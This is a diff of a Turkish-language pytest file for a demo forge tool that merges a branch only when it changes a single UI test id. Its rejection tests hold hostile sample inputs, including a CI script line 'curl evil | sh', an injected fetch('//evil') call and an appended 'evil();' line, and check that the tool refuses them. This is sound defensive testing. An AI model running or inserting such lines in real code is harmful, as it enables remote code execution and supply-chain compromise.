@@ -297,7 +297,7 @@ def test_cli_break_push_ci_kosusu_postgresde(
     engine: Any,
     capfdbinary: pytest.CaptureFixture[bytes],
 ) -> None:
-    """make break → push `run` satırı (main'in yeni sha'sı, isteyen demo-admin) + ci.run işi."""
+    """make break → `demo.await_web` işi (uygulama main'i yansıtınca push CI; yarış yok)."""
     from sqlalchemy import select
     from sqlalchemy.orm import Session
 
@@ -310,18 +310,235 @@ def test_cli_break_push_ci_kosusu_postgresde(
     }
     assert forge_demo.main(["break"], env=env, audit=FakeAudit()) == 0
     out = json.loads(capfdbinary.readouterr().out)
-    assert out["ci_error"] is None and out["ci_run_id"]
+    assert out["ci_error"] is None and out["ci_run_id"].startswith("await-web:")
     with Session(engine) as s:
-        runs = s.scalars(select(Run)).all()
-        assert len(runs) == 1
-        run = runs[0]
-        assert str(run.id) == out["ci_run_id"]
-        assert (run.tetik, run.commit, run.sonuc, run.kaynak) == (
-            "push",
-            forge.head_sha(),
-            "queued",
-            "local",
-        )
-        assert run.pr_no is None and run.ortam["isteyen"] == "demo-admin"
-        isler = s.scalars(select(Job).where(Job.idempotency_key == f"ci.run:{run.id}")).all()
-        assert len(isler) == 1
+        # CI hemen kuyruğa girmez: demo-app-web yeniden derlenmeden koşu `environment` olurdu.
+        assert s.scalars(select(Run)).all() == []
+        jobs = s.scalars(select(Job).where(Job.tur == "demo.await_web")).all()
+        assert len(jobs) == 1
+        assert str(jobs[0].id) == out["ci_run_id"].removeprefix("await-web:")
+        assert jobs[0].yuk["sha"] == forge.head_sha()
+        assert jobs[0].yuk["eylem"] == "break" and jobs[0].yuk["isteyen"] == "demo-admin"
+
+
+# ------------------------------------------------- bypass yalnızca doğrulanmış testid değişimi
+
+
+def _push_break(forge: LocalForge, files: dict[str, str]) -> None:
+    forge.commit_files(BREAK_BRANCH, files, "ek değişiklik")
+
+
+def _assert_dokunulmadi(forge: LocalForge, main: str, audit: FakeAudit) -> None:
+    assert forge.head_sha() == main
+    assert forge.find_open_pr(BREAK_BRANCH) is None  # PR bile açılmaz
+    assert audit.rows == []
+
+
+@pytest.mark.parametrize(
+    ("files", "match"),
+    [
+        # web/src dışı (ör. CI/e2e) kod
+        ({"ci/run.sh": "curl evil | sh\n"}, "dışını değiştiriyor"),
+        # aynı dosyada testid dışında satır değişikliği
+        (
+            {
+                "web/src/CatalogPage.tsx": CATALOG.replace("add-to-cart", "cart-add").replace(
+                    "Sepete ekle", "Sepete ekle{fetch('//evil')}"
+                )
+            },
+            "beklenmeyen değişiklik",
+        ),
+        # satır ekleme
+        (
+            {"web/src/CatalogPage.tsx": CATALOG.replace("add-to-cart", "cart-add") + "evil();\n"},
+            "satır ekliyor",
+        ),
+        # web/src altında yeni dosya
+        ({"web/src/evil.ts": "export const x = 'cart-add';\n"}, "mevcut dosyada"),
+    ],
+)
+def test_break_dal_yalnizca_testid_degisimi_icermezse_reddeder(
+    forge: LocalForge, files: dict[str, str], match: str
+) -> None:
+    _push_break(forge, files)
+    audit, main = FakeAudit(), forge.head_sha()
+    with pytest.raises(ForgeError, match=match):
+        break_locator(forge, audit)
+    _assert_dokunulmadi(forge, main, audit)
+
+
+def test_break_cok_dosya_reddedilir(forge: LocalForge) -> None:
+    _push_break(forge, {f"web/src/f{i}.ts": "x\n" for i in range(forge_demo.MAX_BREAK_FILES)})
+    audit, main = FakeAudit(), forge.head_sha()
+    with pytest.raises(ForgeError, match="çok dosya"):
+        break_locator(forge, audit)
+    _assert_dokunulmadi(forge, main, audit)
+
+
+def test_break_ikili_icerik_reddedilir(forge: LocalForge, demo_bare: Path, tmp_path: Path) -> None:
+    """Geçersiz UTF-8 baytları 'replace' ile eşit görünmesin."""
+    work = tmp_path / "w2"
+    git("clone", "-q", str(demo_bare), str(work))
+    (work / "web" / "src" / "logo.bin").write_bytes(b"\xff\x00")
+    git("add", "-A", cwd=work)
+    git("commit", "-q", "-m", "ikili", cwd=work)
+    git("push", "-q", "origin", "main", cwd=work)  # main: ikili dosya (\xff)
+    git("checkout", "-q", BREAK_BRANCH, cwd=work)
+    git("merge", "-q", "--no-edit", "main", cwd=work)  # main'i dala al: ortak ata = main
+    (work / "web" / "src" / "logo.bin").write_bytes(b"\xfe\x00")
+    git("commit", "-q", "-am", "ikili degisim", cwd=work)
+    git("push", "-q", "origin", BREAK_BRANCH, cwd=work)
+    audit, main = FakeAudit(), forge.head_sha()
+    with pytest.raises(ForgeError, match="metin olmayan"):
+        break_locator(forge, audit)
+    _assert_dokunulmadi(forge, main, audit)
+
+
+def test_break_dogrulama_sonrasi_dal_ilerlerse_merge_etmez(
+    forge: LocalForge, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Fark doğrulandıktan sonra (PR açılmadan) dala push: PR head ≠ doğrulanan head → red."""
+    real_open = forge.open_pr
+
+    def push_then_open(*a: Any, **kw: Any) -> Any:
+        forge.commit_files(BREAK_BRANCH, {"ci/run.sh": "evil\n"}, "yarış")
+        return real_open(*a, **kw)
+
+    monkeypatch.setattr(forge, "open_pr", push_then_open)
+    audit, main = FakeAudit(), forge.head_sha()
+    with pytest.raises(ForgeError, match="doğrulanan head"):
+        break_locator(forge, audit)
+    assert forge.head_sha() == main
+    assert audit.rows == []
+
+
+def test_break_denetimde_fark_ozeti(forge: LocalForge) -> None:
+    audit = FakeAudit()
+    head = forge.head_sha(BREAK_BRANCH)
+    base = forge.head_sha("demo-baseline")
+    out = break_locator(forge, audit)
+    assert out.changed is True
+    assert audit.rows[0][3]["fark"] == {
+        "head": head,
+        "taban": base,
+        "dosyalar": ["web/src/CatalogPage.tsx"],
+        "degisen_satir": 1,
+    }
+
+
+def test_break_bayat_dalda_fark_ortak_atadan(forge: LocalForge) -> None:
+    """main ilerlediyse (e2e dosyası eklendi) fark üç noktalıdır: main'in eklemeleri sayılmaz."""
+    forge.commit_files("tp/case-y", {"e2e/tests/y.spec.ts": "// y\n"}, "y")
+    forge.require_up_to_date = False
+    forge.merge_pr(forge.open_pr("tp/case-y", "y", "").number, "demo-admin")
+    forge.require_up_to_date = True
+    fark = forge_demo.verify_break_diff(forge, forge.head_sha(BREAK_BRANCH))
+    assert fark["dosyalar"] == ["web/src/CatalogPage.tsx"]
+    assert forge.merge_base("main", BREAK_BRANCH) == forge.head_sha("demo-baseline")
+
+
+def test_verify_forge_destegi_yoksa() -> None:
+    with pytest.raises(ForgeValidationError):
+        forge_demo.verify_break_diff(object(), "a" * 40)  # type: ignore[arg-type]
+
+
+# ------------------------------------------------- web-state (forge-init.sh idempotentliği)
+
+
+def test_tree_sha_web_agaci(forge: LocalForge, demo_bare: Path) -> None:
+    main = forge.head_sha()
+    assert forge.tree_sha(main, "web") == git("rev-parse", f"{main}:web", git_dir=demo_bare)
+    assert forge.tree_sha("main", "yok") is None
+    assert forge.tree_sha("main", "web/Dockerfile") is None  # dizin değil
+
+
+def test_web_state_ayni_commit_guncel(forge: LocalForge) -> None:
+    main = forge.head_sha()
+    ws = forge_demo.web_state(
+        forge, build_json={"sha": main, "web_tree": ""}, sha_file=main + "\n", busy=[]
+    )
+    assert ws["guncel"] is True and ws["sha_dosyasi_guncel"] is True
+    assert ws["main"] == main and ws["mesgul"] == []
+
+
+def test_web_state_ayni_web_agaci_guncel_sha_dosyasi_eski(forge: LocalForge) -> None:
+    base = forge.head_sha()
+    break_locator(forge, FakeAudit(), ci=FakeCi())
+    restore_baseline(forge, FakeAudit(), ci=FakeCi())
+    # main baseline'a döndü (aynı sha); farklı bir commit'ten ama aynı web/ ağacı:
+    tree = forge.tree_sha("main", "web")
+    ws = forge_demo.web_state(
+        forge, build_json={"sha": "d" * 40, "web_tree": tree}, sha_file="d" * 40, busy=None
+    )
+    assert ws["guncel"] is True and ws["neden"] == "aynı web/ ağacı"
+    assert ws["sha_dosyasi_guncel"] is False and ws["mesgul"] is None
+    assert ws["main"] == base
+
+
+def test_web_state_kirik_main_eski_imaj_guncel_degil(forge: LocalForge) -> None:
+    base = forge.head_sha()
+    base_tree = forge.tree_sha(base, "web")
+    out = break_locator(forge, FakeAudit(), ci=FakeCi())
+    ws = forge_demo.web_state(
+        forge, build_json={"sha": base, "web_tree": base_tree}, sha_file=base, busy=[]
+    )
+    assert ws["guncel"] is False and ws["main"] == out.main_after
+    assert ws["main_web_tree"] != base_tree
+
+
+@pytest.mark.parametrize(
+    ("build", "neden"),
+    [(None, "okunamadı"), ({"service": "demo-app-web", "sha": "", "web_tree": ""}, "çalışma")],
+)
+def test_web_state_bilinmeyen_calisan_guncel_degil(
+    forge: LocalForge, build: dict[str, Any] | None, neden: str
+) -> None:
+    ws = forge_demo.web_state(forge, build_json=build, sha_file=None)
+    assert ws["guncel"] is False and neden in ws["neden"]
+    assert ws["sha_dosyasi_guncel"] is False
+
+
+def test_cli_web_state(
+    forge: LocalForge,
+    demo_bare: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    capfdbinary: pytest.CaptureFixture[bytes],
+) -> None:
+    env = {"TP_FORGE": "local", "TP_FORGE_PATH": str(demo_bare)}
+    main = forge.head_sha()
+    monkeypatch.setattr(forge_demo, "_web_inputs", lambda: ({"sha": main}, main))
+    monkeypatch.setattr(forge_demo, "_busy_jobs", lambda: [{"id": "j1", "tur": "ci.run"}])
+    assert forge_demo.main(["web-state"], env=env) == 0
+    ws = json.loads(capfdbinary.readouterr().out)
+    assert ws["guncel"] is True and ws["mesgul"] == [{"id": "j1", "tur": "ci.run"}]
+
+    def no_db() -> Any:
+        raise OSError("bağlantı reddedildi")
+
+    monkeypatch.setattr(forge_demo, "_busy_jobs", no_db)
+    assert forge_demo.main(["web-state"], env=env) == 0
+    cap = capfdbinary.readouterr()
+    assert json.loads(cap.out)["mesgul"] is None and b"UYARI" in cap.err
+
+
+def test_e2e_testid_ve_locator_durumu() -> None:
+    from tp_core.integrations import forge_demo as fd
+
+    class _F:
+        def __init__(self, metin: str | None) -> None:
+            self.metin = metin
+
+        def read_file(self, path: str, ref: str = "main") -> str:
+            assert path == fd.E2E_LOCATOR_PATH
+            if self.metin is None:
+                raise FileNotFoundError(path)
+            return self.metin
+
+    satir = 'addToCart: { testId: "%s", role: "button", name: "Sepete ekle" },'
+    assert fd.e2e_testid_state(_F(satir % "add-to-cart")) == "add-to-cart"  # type: ignore[arg-type]
+    assert fd.e2e_testid_state(_F(satir % "cart-add")) == "cart-add"  # type: ignore[arg-type]
+    assert fd.e2e_testid_state(_F(None)) is None  # type: ignore[arg-type]
+    assert fd.locator_durumu("add-to-cart", "add-to-cart") == "baseline"
+    assert fd.locator_durumu("cart-add", "add-to-cart") == "kirik"
+    assert fd.locator_durumu("cart-add", "cart-add") == "onarildi"
+    assert fd.locator_durumu("belirsiz", None) is None
